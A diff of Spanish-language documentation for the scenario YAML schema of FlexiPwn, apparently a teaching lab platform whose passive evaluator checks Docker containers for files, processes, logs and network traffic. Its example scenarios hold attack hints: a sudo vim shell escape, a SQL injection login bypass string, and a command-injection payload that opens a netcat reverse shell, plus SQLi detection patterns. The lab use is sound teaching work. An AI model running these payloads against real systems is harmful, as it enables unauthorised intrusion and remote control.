@@ -1,310 +1,534 @@
-# Guía de escenarios FlexiPwn
+# Schema YAML de Escenarios FlexiPwn
 
 ## Introducción
 
-Cada escenario de FlexiPwn se define en un archivo YAML que describe el entorno Docker, las condiciones de victoria y las pistas para el estudiante. La plataforma lee este archivo al crear un "run" y lo usa para evaluar automáticamente si el participante ha completado los objetivos — sin intervención del instructor.
+Cada escenario de FlexiPwn se define en un archivo YAML que describe el entorno Docker, las condiciones de victoria y las pistas para el estudiante. La plataforma lee este archivo al crear un *run* y lo usa para evaluar automáticamente si el participante ha completado los objetivos — sin intervención del instructor.
 
-El motor de evaluación es completamente pasivo: nunca ejecuta comandos en el contenedor ni modifica el entorno. Solo observa eventos (archivos creados, procesos activos, respuestas HTTP) y los compara contra los targets que defines aquí. Cuando se cumplen las condiciones, el run se marca como completado y la plataforma registra la hora y el progreso.
+El motor de evaluación es completamente pasivo: nunca ejecuta comandos en el contenedor ni modifica el entorno. Solo observa eventos (archivos creados, procesos activos, líneas de log, paquetes de red) y los compara contra los targets que defines aquí. Cuando se cumplen las condiciones, el run se marca como completado y la plataforma registra la hora y el progreso.
 
 ---
 
-## Estructura completa anotada
+## Estructura general
 
 ```yaml
-# Metadatos del escenario
-title: "Privesc via sudo vim"           # Nombre corto (aparece en la UI)
-description: >                          # Descripción larga para el estudiante
-  Consigue acceso root explotando una
-  configuración insegura de sudo.
-author: "instructor@universidad.edu"    # Autor — solo informativo
-level: beginner                         # beginner | intermediate | advanced
-category: pwning                        # pwning | web | database | forensics | reversing
+# ── Metadata ────────────────────────────────────────────────────────────────
+title: "Título del escenario"          # requerido
+description: >                         # requerido
+  Descripción larga para el estudiante.
+author: "Nombre o email"               # requerido
+level: beginner                        # requerido: beginner | intermediate | advanced
+category: web                          # requerido: pwning | web | database | forensics | reversing
 
-# Entorno Docker
+# ── Entorno Docker ───────────────────────────────────────────────────────────
 environment:
-  image: "flexipwn/debian-sudovim:1.0"  # Imagen del contenedor vulnerable (obligatorio)
-  attacker_image: null                  # Imagen del atacante — null si no se necesita
-  log_paths:                            # Rutas de logs a monitorear (Capa 2)
-    - /var/log/auth.log
-  volumes: {}                           # Volúmenes extra: {host_path: container_path}
-  network: null                         # Red Docker custom — null para red por defecto
-  ports: []                             # Puertos a exponer: ["8080:80", "3306:3306"]
+  image: "nombre-imagen-vulnerable"    # requerido
+  attacker_image: "nombre-imagen"      # opcional, default null
+  log_paths: []                        # opcional, lista de rutas dentro del contenedor
+  ports: []                            # opcional, "host:container" para el contenedor vulnerable
+  attacker_ports: []                   # opcional, "host:container" para el contenedor atacante
+  startup_delay_seconds: 3.0           # opcional, float, default 3.0 (usa config global si null)
+  capture_filter: ""                   # opcional, filtro BPF para tcpdump (ej. "port 3306")
 
-# Pistas mostradas al estudiante en orden (opcional)
-hints:
-  - "Revisa qué comandos puedes ejecutar como root con sudo -l"
-  - "vim tiene modo shell. Busca cómo escapar al sistema operativo desde dentro."
-  - "Una vez dentro de vim como root, prueba :!/bin/bash"
+# ── Pistas ───────────────────────────────────────────────────────────────────
+hints:                                 # opcional
+  - "Primera pista (mostrada primero)"
+  - "Segunda pista"
 
-# Condición de victoria: "any" (basta con uno) | "all" (todos requeridos)
-condition: all
-
-# Tiempo máximo del run en segundos (default: 1800 = 30 min)
-timeout_seconds: 1800
-
-# Lista de objetivos a evaluar
-targets:
+# ── Condiciones de victoria ──────────────────────────────────────────────────
+targets:                               # requerido, al menos uno
   - type: file_created
-    description: "El estudiante creó el archivo /root/pwned.txt"
-    path: /root/pwned.txt
+    path: "/root/"
+    pattern: "*.txt"
+    description: "Descripción visible al estudiante"
+
+condition: all    # "any" | "all" — aplica a targets de primer nivel sin nodos lógicos
+timeout_seconds: 1800                  # default 1800 (30 min)
 ```
 
 ---
 
-## Tipos de target disponibles
+## Campos de metadata
 
-### `file_created`
+| Campo | Tipo | Requerido | Valores válidos |
+|-------|------|-----------|-----------------|
+| `title` | string | sí | Texto libre |
+| `description` | string | sí | Texto libre (soporta bloque `>`) |
+| `author` | string | sí | Nombre o email |
+| `level` | string | sí | `beginner` \| `intermediate` \| `advanced` |
+| `category` | string | sí | `pwning` \| `web` \| `database` \| `forensics` \| `reversing` |
+
+---
+
+## environment
+
+| Campo | Tipo | Requerido | Default | Descripción |
+|-------|------|-----------|---------|-------------|
+| `image` | string | **sí** | — | Imagen Docker del contenedor vulnerable |
+| `attacker_image` | string | no | `null` | Imagen Docker del contenedor atacante |
+| `log_paths` | list[string] | no | `[]` | Rutas de archivos de log **dentro del contenedor** a monitorear |
+| `ports` | list[string] | no | `[]` | Mapeos de puertos del contenedor vulnerable (`"host:container"`) |
+| `attacker_ports` | list[string] | no | `[]` | Mapeos de puertos del contenedor atacante (`"host:container"`) |
+| `startup_delay_seconds` | float | no | `3.0` | Segundos de espera tras arrancar el contenedor. `null` usa el default global. `0.0` es válido (confía en el HEALTHCHECK del contenedor). |
+| `capture_filter` | string | no | `""` | Filtro BPF para tcpdump (ej. `"port 3306"`). Vacío captura todo el tráfico. **Solo activo si hay targets de tipo `network_payload` o `network_connection`.** |
+
+---
+
+## hints
+
+Lista ordenada de strings. Opcional. Las pistas se muestran al estudiante en el orden definido.
+
+```yaml
+hints:
+  - "Revisa tus permisos sudo con: sudo -l"
+  - "Vim puede ejecutar comandos del sistema con :!comando"
+```
+
+---
+
+## targets
+
+Lista de condiciones de victoria. Al menos un target es requerido. Cada target tiene un campo `type` que determina sus campos específicos.
+
+### Tipos atómicos
+
+#### `file_created`
 
 Detecta cuando un archivo nuevo aparece en el filesystem del contenedor.
 
-| Campo | Obligatorio | Descripción |
-|-------|-------------|-------------|
-| `path` | Sí | Path exacto del archivo, o directorio terminado en `/` |
-| `pattern` | No | Glob para filtrar por nombre (solo si `path` termina en `/`) |
+| Campo | Tipo | Requerido | Descripción |
+|-------|------|-----------|-------------|
+| `path` | string | **sí** | Ruta exacta del archivo, o directorio si termina en `/` |
+| `pattern` | string | no | Glob para filtrar nombres de archivo (solo si `path` termina en `/`) |
+| `description` | string | no | Descripción visible al estudiante |
 
-**Ejemplo — archivo exacto:**
+**Evento Layer 2:** `file_created`
+
 ```yaml
 - type: file_created
-  description: "Archivo de bandera creado por el estudiante"
-  path: /root/pwned.txt
+  path: "/root/"
+  pattern: "*.txt"
+  description: "Archivo .txt creado en /root"
 ```
 
-**Ejemplo — cualquier `.txt` en un directorio:**
 ```yaml
 - type: file_created
-  description: "Cualquier archivo .txt creado en /tmp/"
-  path: /tmp/
-  pattern: "*.txt"
+  path: "/tmp/pwned"
+  description: "Archivo /tmp/pwned creado"
 ```
 
 ---
 
-### `file_modified`
+#### `file_modified`
 
 Detecta cuando un archivo preexistente es modificado.
 
-| Campo | Obligatorio | Descripción |
-|-------|-------------|-------------|
-| `path` | Sí | Path exacto del archivo a vigilar |
+| Campo | Tipo | Requerido | Descripción |
+|-------|------|-----------|-------------|
+| `path` | string | **sí** | Ruta exacta del archivo, o directorio si termina en `/` |
+| `description` | string | no | Descripción visible al estudiante |
 
-**Ejemplo:**
+**Evento Layer 2:** `file_modified`
+
 ```yaml
 - type: file_modified
-  description: "El archivo /etc/passwd fue modificado"
-  path: /etc/passwd
+  path: "/etc/passwd"
+  description: "/etc/passwd fue modificado"
 ```
 
 ---
 
-### `file_exists`
+#### `file_exists`
 
-Verifica periódicamente (polling) que un archivo exista y opcionalmente contenga un texto específico.
+Comprueba mediante polling que un archivo existe (opcionalmente con contenido específico).
 
-| Campo | Obligatorio | Descripción |
-|-------|-------------|-------------|
-| `path` | Sí | Path exacto del archivo |
-| `contains` | No | Substring que debe aparecer en el contenido del archivo |
+| Campo | Tipo | Requerido | Descripción |
+|-------|------|-----------|-------------|
+| `path` | string | **sí** | Ruta exacta del archivo |
+| `contains` | string | no | Subcadena que debe aparecer en el contenido del archivo |
+| `description` | string | no | Descripción visible al estudiante |
 
-**Ejemplo — solo existencia:**
+**Evento Layer 2:** `file_exists`
+
 ```yaml
 - type: file_exists
-  description: "El archivo de bandera existe"
-  path: /root/flag.txt
-```
-
-**Ejemplo — con contenido esperado:**
-```yaml
-- type: file_exists
-  description: "La bandera contiene el texto correcto"
-  path: /root/flag.txt
-  contains: "FLAG{privesc_ok}"
+  path: "/root/flag.txt"
+  contains: "FLAG{"
+  description: "Flag encontrada en /root/flag.txt"
 ```
 
 ---
 
-### `process_running` _(disponible en versión futura)_
+#### `process_running`
 
-Detecta cuando un proceso específico está corriendo con un usuario (euid) determinado.
+Detecta cuando un proceso se ejecuta con un UID efectivo y comando específicos.
 
-| Campo | Obligatorio | Descripción |
-|-------|-------------|-------------|
-| `euid` | Sí | UID efectivo del proceso (0 = root) |
-| `cmd_contains` | Sí | Substring que debe aparecer en la línea de comando |
+| Campo | Tipo | Requerido | Descripción |
+|-------|------|-----------|-------------|
+| `euid` | int | **sí** | UID efectivo del proceso (0 = root) |
+| `cmd_contains` | string | **sí** | Subcadena que debe aparecer en la línea de comando |
+| `ppid_cmd_contains` | string | no | Subcadena que debe aparecer en el comando del proceso padre |
+| `ancestor_contains` | string | no | Subcadena que debe aparecer en el comando de cualquier ancestro |
+| `description` | string | no | Descripción visible al estudiante |
+
+**Evento Layer 2:** `process_spawned`
+
+Todas las condiciones especificadas deben cumplirse (lógica AND).
 
 ```yaml
-# Ejemplo (versión futura)
 - type: process_running
-  description: "Shell corriendo como root"
   euid: 0
-  cmd_contains: "/bin/bash"
+  cmd_contains: "bash"
+  ppid_cmd_contains: "vim"
+  ancestor_contains: "sudo"
+  description: "Shell root lanzada desde vim vía sudo"
 ```
 
 ---
 
-### `log_pattern` _(disponible en versión futura)_
+#### `log_pattern`
 
-Detecta cuando una línea de log estructurado coincide con un conjunto de campos.
+Detecta entradas de log que coincidan con patrones regex.
 
-| Campo | Obligatorio | Descripción |
-|-------|-------------|-------------|
-| `field_matches` | Sí | Dict de campo → valor esperado |
+| Campo | Tipo | Requerido | Descripción |
+|-------|------|-----------|-------------|
+| `field_matches` | dict[str, str] | **sí** | Mapa de campo → regex. Todos los patrones deben coincidir. |
+| `description` | string | no | Descripción visible al estudiante |
+
+**Evento Layer 2:** `log_entry`
+
+Campos disponibles en `field_matches`:
+- `raw_line` — línea cruda de log (texto plano)
+- Cualquier campo del objeto JSON parseado (para logs estructurados)
+
+El matching usa `re.search()` (el patrón puede aparecer en cualquier posición). Case-sensitive por defecto.
 
 ```yaml
-# Ejemplo (versión futura)
 - type: log_pattern
-  description: "Login exitoso como root en auth.log"
   field_matches:
-    user: root
-    action: session_opened
+    raw_line: "SELECT.*sensitive_data"
+  description: "Query sobre sensitive_data en logs MySQL"
+```
+
+```yaml
+- type: log_pattern
+  field_matches:
+    event_type: "authentication_success"
+  description: "Login exitoso registrado en log de aplicación"
+```
+
+Requiere que `log_paths` esté configurado en `environment`.
+
+---
+
+#### `network_payload`
+
+Detecta payloads de paquetes de red que coincidan con un patrón regex.
+
+| Campo | Tipo | Requerido | Descripción |
+|-------|------|-----------|-------------|
+| `field_matches` | dict[str, str] | **sí** | La clave se ignora; el valor es regex aplicado al campo `data` del payload |
+| `description` | string | no | Descripción visible al estudiante |
+
+**Evento Layer 2:** `network_payload`
+
+El matching es **case-insensitive** y usa `re.search()`. El campo `data` contiene el ASCII imprimible extraído del payload del paquete.
+
+```yaml
+- type: network_payload
+  field_matches:
+    data: "SELECT.*users"
+  description: "Query SQL sobre users detectada en tráfico"
+```
+
+```yaml
+- type: network_payload
+  field_matches:
+    data: "OR.*1.*=.*1|UNION.*SELECT|#"
+  description: "Patrón de SQLi en tráfico de red"
+```
+
+Requiere `attacker_image` y opcionalmente `capture_filter` en `environment`.
+
+---
+
+#### `network_connection`
+
+Detecta conexiones TCP establecidas hacia un puerto específico. Se activa en paquetes SYN-ACK (indica conexión establecida exitosamente).
+
+| Campo | Tipo | Requerido | Descripción |
+|-------|------|-----------|-------------|
+| `dst_port` | int | **sí** | Puerto de destino a detectar |
+| `dst_ip` | string | no | IP de destino (si se omite, coincide con cualquier IP) |
+| `description` | string | no | Descripción visible al estudiante |
+
+**Evento Layer 2:** `network_connection`
+
+```yaml
+- type: network_connection
+  dst_port: 4444
+  description: "Reverse shell hacia puerto 4444 detectada"
+```
+
+```yaml
+- type: network_connection
+  dst_port: 443
+  dst_ip: "10.0.0.5"
+  description: "Conexión HTTPS al servidor C2"
+```
+
+Requiere `attacker_image` en `environment`.
+
+---
+
+### Tipos lógicos (nodos recursivos)
+
+Los nodos lógicos permiten combinar targets con lógica booleana. Son recursivos: pueden contener otros nodos lógicos.
+
+**Restricción:** Los nodos `not` no pueden ser targets de primer nivel. Deben ir dentro de un `and` o `or`.
+
+#### `and`
+
+Todos los sub-targets deben cumplirse.
+
+Requiere al menos 2 sub-targets.
+
+```yaml
+- type: and
+  targets:
+    - type: file_created
+      path: "/root/flag.txt"
+    - type: process_running
+      euid: 0
+      cmd_contains: "bash"
+  description: "Flag creada Y shell root activa"
+```
+
+#### `or`
+
+Al menos un sub-target debe cumplirse.
+
+Requiere al menos 2 sub-targets.
+
+```yaml
+- type: or
+  targets:
+    - type: network_payload
+      field_matches:
+        data: "password=admin"
+    - type: log_pattern
+      field_matches:
+        raw_line: "authentication failure"
+  description: "Ataque detectado por red o por logs"
+```
+
+#### `not`
+
+El sub-target no debe cumplirse.
+
+Requiere exactamente 1 sub-target.
+
+```yaml
+- type: and
+  targets:
+    - type: file_created
+      path: "/root/flag.txt"
+    - type: not
+      targets:
+        - type: log_pattern
+          field_matches:
+            raw_line: "ALARM"
+      description: "Sin alertas en logs"
+  description: "Flag creada sin disparar alertas"
 ```
 
 ---
 
-### `http_response_contains` _(disponible en versión futura)_
+### Tipos NO implementados
 
-Verifica que una respuesta HTTP del contenedor tenga cierto contenido.
+Los siguientes tipos están definidos en el schema pero fuera del scope de implementación actual. Incluirlos en un escenario generará un error de validación o no producirá eventos.
 
-| Campo | Obligatorio | Descripción |
-|-------|-------------|-------------|
-| `url_path` | Sí | Ruta de la petición (e.g. `/admin`) |
-| `body_contains` | No | Substring esperado en el cuerpo |
-| `status_code` | No | Código HTTP esperado (e.g. `200`) |
-
-```yaml
-# Ejemplo (versión futura)
-- type: http_response_contains
-  description: "Login bypass exitoso"
-  url_path: /admin
-  status_code: 200
-  body_contains: "Bienvenido, admin"
-```
+| Tipo | Descripción |
+|------|-------------|
+| `http_response_contains` | Verificar que una respuesta HTTP contiene texto esperado |
+| `database_query_result` | Verificar que una query a base de datos retorna un resultado esperado |
 
 ---
 
-### `database_query_result` _(disponible en versión futura)_
+## condition
 
-Verifica el resultado de una consulta SQL en la base de datos del contenedor.
+Aplica **solo a targets de primer nivel** cuando no se usan nodos lógicos (`and`/`or`/`not`).
 
-| Campo | Obligatorio | Descripción |
-|-------|-------------|-------------|
-| `table` | Sí | Tabla sobre la que se consulta |
-| `result_contains` | Sí | Valor esperado en el resultado |
+| Valor | Comportamiento |
+|-------|---------------|
+| `any` | El escenario se completa cuando **al menos un** target de primer nivel se cumple |
+| `all` | El escenario se completa cuando **todos** los targets de primer nivel se cumplen |
 
-```yaml
-# Ejemplo (versión futura)
-- type: database_query_result
-  description: "Dato exfiltrado de la tabla users"
-  table: users
-  result_contains: "admin@corp.com"
-```
+Cuando se usan nodos lógicos, `condition` es ignorado: la lógica la determinan los nodos.
+
+---
+
+## timeout_seconds
+
+Duración máxima de la sesión en segundos. Si el estudiante no completa el escenario en este tiempo, la sesión termina como fallida.
+
+- Tipo: `int`
+- Default: `1800` (30 minutos)
 
 ---
 
 ## Ejemplos completos
 
-### Escenario de pwning — Privesc via sudo vim
+### 1. privesc-demo.yaml — Escalación de privilegios (sin red)
 
 ```yaml
-title: "Privesc via sudo vim"
+title: "Privilege escalation via sudo vim"
 description: >
-  El usuario `student` puede ejecutar vim como root usando sudo.
-  Escapa al shell de root y deja evidencia de tu acceso.
-author: "instructor@universidad.edu"
+  El usuario ctfuser tiene permisos sudo sobre vim sin contraseña.
+  Escala privilegios y crea evidencia de acceso root.
+author: "Dylan Riquelme"
 level: beginner
 category: pwning
 
 environment:
-  image: "flexipwn/debian-sudovim:1.0"
-  log_paths:
-    - /var/log/auth.log
+  image: "flexipwn/vulnerable-sudo:latest"
+  startup_delay_seconds: 3
 
 hints:
-  - "¿Qué comandos puedes ejecutar como root? Prueba: sudo -l"
-  - "vim tiene un modo de comandos de shell. ¿Cómo se activa?"
-  - "Desde dentro de vim (como root): :!/bin/bash"
-
-condition: all
-timeout_seconds: 1800
+  - "Revisa tus permisos sudo con: sudo -l"
+  - "Vim puede ejecutar comandos del sistema con :!comando"
 
 targets:
   - type: file_created
-    description: "Archivo /root/pwned.txt creado (evidencia de root)"
-    path: /root/pwned.txt
+    path: "/root/"
+    pattern: "*.txt"
+    description: "Archivo .txt creado en directorio root"
 
   - type: file_modified
-    description: "/etc/passwd fue modificado (añadiste un usuario root)"
-    path: /etc/passwd
+    path: "/etc/passwd"
+    description: "Archivo de usuarios del sistema modificado"
+
+  - type: process_running
+    euid: 0
+    cmd_contains: "bash"
+    ppid_cmd_contains: "vim"
+    ancestor_contains: "sudo"
+    description: "Shell root lanzada desde vim (escalación exitosa)"
+
+condition: all
+timeout_seconds: 1800
 ```
+
+**Qué monitorea:** filesystem (`file_created`, `file_modified`) y procesos (`process_running`). No levanta contenedor atacante ni captura red.
 
 ---
 
-### Escenario de web — SQLi login bypass
+### 2. sqli-mysql-demo.yaml — SQL Injection (logs + red con filtro)
 
 ```yaml
-title: "SQL Injection — Login bypass"
+title: "SQL injection login bypass"
 description: >
-  La aplicación web tiene un login vulnerable a SQL injection clásica.
-  Entra como administrador sin conocer la contraseña.
-author: "instructor@universidad.edu"
+  La aplicación tiene una vulnerabilidad de SQL injection en el formulario
+  de login. Explota la vulnerabilidad para autenticarte sin credenciales
+  válidas y acceder a datos de la tabla sensitive_data.
+author: "Dylan Riquelme"
+level: beginner
+category: web
+
+environment:
+  image: "vuln-sqli-mysql"
+  attacker_image: "flexipwn-attacker-web"
+  log_paths:
+    - "/var/log/mysql/general.log"
+    - "/var/log/app/app.log"
+  ports:
+    - "5000:5000"
+  capture_filter: "port 3306"
+  startup_delay_seconds: 10.0
+
+hints:
+  - "Prueba ingresar una comilla simple en el campo de usuario"
+  - "El operador OR puede ser útil para evadir condiciones AND"
+  - "Ejemplo: admin' OR '1'='1' #"
+
+targets:
+  - type: log_pattern
+    field_matches:
+      raw_line: "SELECT.*sensitive_data"
+    description: "Query SQL sobre tabla sensitive_data detectada"
+
+  - type: log_pattern
+    field_matches:
+      raw_line: "OR.*1.*=.*1|UNION.*SELECT|#"
+    description: "Patrón de SQL injection detectado en query ejecutada"
+
+  - type: log_pattern
+    field_matches:
+      event_type: "authentication_success"
+    description: "Login exitoso detectado en log de aplicación"
+
+  - type: network_payload
+    field_matches:
+      data: "SELECT.*users"
+    description: "Query SQL sobre tabla users detectada en tráfico de red"
+
+  - type: network_payload
+    field_matches:
+      data: "OR.*1.*=.*1|UNION.*SELECT|#"
+    description: "Patrón de SQL injection detectado en tráfico de red"
+
+  - type: network_payload
+    field_matches:
+      data: "FLAG\\{sql_injection_detected\\}|internal-api-key-xyz"
+    description: "Datos sensibles filtrados detectados en respuesta de red"
+
+condition: all
+timeout_seconds: 18000
+```
+
+**Qué monitorea:** logs de MySQL y aplicación (`log_pattern`) y tráfico de red filtrado al puerto 3306 (`network_payload`). El `capture_filter: "port 3306"` limita tcpdump solo al tráfico MySQL, reduciendo ruido.
+
+---
+
+### 3. command-injection-demo.yaml — Inyección de comandos → Reverse Shell (red sin filtro)
+
+```yaml
+title: "Command Injection → Reverse Shell"
+description: >
+  La aplicación vulnerable expone un endpoint /ping?host=... que ejecuta
+  el comando sin sanitizar. Explota la inyección para establecer una reverse
+  shell desde el servidor hacia tu máquina atacante.
+author: "Dylan Riquelme"
 level: intermediate
 category: web
 
 environment:
-  image: "flexipwn/php-sqli-lab:1.0"
-  ports:
-    - "8080:80"
-  log_paths:
-    - /var/log/apache2/access.log
+  image: "vuln-command-injection"
+  attacker_image: "flexipwn-attacker"
+  attacker_ports:
+    - "2222:22"
+  startup_delay_seconds: 3.0
 
 hints:
-  - "Observa cómo la aplicación construye la query SQL con tu input."
-  - "¿Qué pasa si escribes una comilla simple en el campo usuario?"
-  - "Intenta: ' OR '1'='1 como usuario (y cualquier contraseña)."
-
-condition: any
-timeout_seconds: 3600
+  - "El env_id se muestra al iniciar el run. Los contenedores se llaman flexipwn-{env_id}-vulnerable y flexipwn-{env_id}-attacker dentro de la red interna."
+  - "Primero entra al atacante por SSH (puerto expuesto en la CLI) y abre un listener: nc -lvp 4444"
+  - "Desde el atacante, envía el payload al vulnerable: curl 'http://flexipwn-{env_id}-vulnerable:5000/ping?host=;nc+flexipwn-{env_id}-attacker+4444+-e+/bin/bash'"
+  - "El endpoint /ping ejecuta el comando sin sanitizar"
 
 targets:
+  - type: network_connection
+    dst_port: 4444
+    description: "Conexión TCP hacia el puerto 4444 del atacante detectada"
+
   - type: file_created
-    description: "Archivo de sesión admin creado tras login exitoso"
-    path: /var/www/html/sessions/
-    pattern: "admin_*.sess"
+    path: "/root/"
+    pattern: "*.txt"
+    description: "Archivo .txt creado en directorio root"
 
-  - type: file_exists
-    description: "El archivo de bandera fue leído (solo accesible como admin)"
-    path: /var/www/html/admin/flag.txt
-    contains: "FLAG{sqli_bypass}"
+condition: all
+timeout_seconds: 1800
 ```
 
----
-
-## Condiciones de victoria
-
-La clave `condition` determina cuántos targets deben cumplirse para considerar el escenario completado.
-
-### `condition: all`
-
-**Todos** los targets deben matchear. Úsalo cuando quieras que el estudiante demuestre varios pasos del ataque.
-
-```
-Objetivo 1: modificar /etc/passwd   ✓
-Objetivo 2: crear /root/pwned.txt   ✓
-→ Completado
-```
-
-Ideal para: ejercicios de privesc con múltiples etapas, cadenas de explotación.
-
-### `condition: any`
-
-**Basta con que uno** de los targets matchee. Úsalo cuando hay múltiples caminos válidos al mismo objetivo.
-
-```
-Objetivo 1: bypass via SQLi     ✓   ← matcheó primero
-Objetivo 2: bypass via NoSQLi   ✗
-→ Completado
-```
-
-Ideal para: escenarios con varias técnicas válidas, CTFs donde el path importa menos que llegar al flag.
+**Qué monitorea:** conexión TCP establecida al puerto 4444 (`network_connection`) y filesystem (`file_created`). Sin `capture_filter`, tcpdump captura todo el tráfico entre contenedores. `attacker_ports` expone SSH del atacante al host para que el estudiante pueda conectarse.
 
 ---
 
@@ -328,7 +552,7 @@ ValueError: El tipo 'file_created' requiere el campo 'path'
 # Correcto
 - type: file_created
   description: "Flag creada"
-  path: /root/pwned.txt
+  path: "/root/pwned.txt"
 ```
 
 ---
@@ -373,12 +597,12 @@ level: advanced
 ```yaml
 # No tiene el efecto esperado — pattern se ignora
 - type: file_created
-  path: /root/pwned.txt
+  path: "/root/pwned.txt"
   pattern: "*.txt"
 
 # Correcto — vigilar cualquier .txt en el directorio
 - type: file_created
-  path: /root/
+  path: "/root/"
   pattern: "*.txt"
 ```
 
@@ -391,18 +615,52 @@ level: advanced
 ```yaml
 # Incorrecto — contains se ignora en file_created
 - type: file_created
-  path: /root/flag.txt
+  path: "/root/flag.txt"
   contains: "FLAG{ok}"
 
 # Correcto — usar file_exists para verificar contenido
 - type: file_exists
-  path: /root/flag.txt
+  path: "/root/flag.txt"
   contains: "FLAG{ok}"
 ```
 
 ---
 
-### 6. Imagen Docker no disponible localmente
+### 6. `not` como target de primer nivel
+
+**Error:**
+```
+ValidationError: El nodo lógico 'not' no puede ser un target de primer nivel
+```
+
+**Causa:** Un escenario que solo tiene un `not` se completaría por la ausencia de un evento — peligroso (puede completarse sin acción del estudiante). Debe envolverse en un `and` o `or` con al menos un target positivo.
+
+**Corrección:**
+```yaml
+# Incorrecto
+targets:
+  - type: not
+    targets:
+      - type: log_pattern
+        field_matches:
+          raw_line: "ALARM"
+
+# Correcto
+targets:
+  - type: and
+    targets:
+      - type: file_created
+        path: "/root/flag.txt"
+      - type: not
+        targets:
+          - type: log_pattern
+            field_matches:
+              raw_line: "ALARM"
+```
+
+---
+
+### 7. Imagen Docker no disponible localmente
 
 **Error en tiempo de ejecución:**
 ```
@@ -411,4 +669,12 @@ ImageNotFoundError: La imagen 'flexipwn/mi-lab:1.0' no existe localmente ni en e
 
 **Causa:** La imagen especificada en `environment.image` no está disponible. La plataforma no construye imágenes automáticamente.
 
-**Corrección:** Asegúrate de que la imagen esté publicada en un registro accesible o disponible localmente con `docker pull`.
+**Corrección:** Asegúrate de que la imagen esté publicada en un registro accesible o disponible localmente con `docker pull` o `docker build` (ver sección de instalación del README).
+
+---
+
+### 8. `capture_filter` sin targets de red
+
+**Problema:** El `capture_filter` solo tiene efecto si el escenario tiene targets de tipo `network_payload` o `network_connection`. Definirlo sin esos targets no levanta el sniffer y es ruido en el YAML.
+
+**Corrección:** Si no usás `network_*` targets, omití `capture_filter` y `attacker_image` (para escenarios sin red).
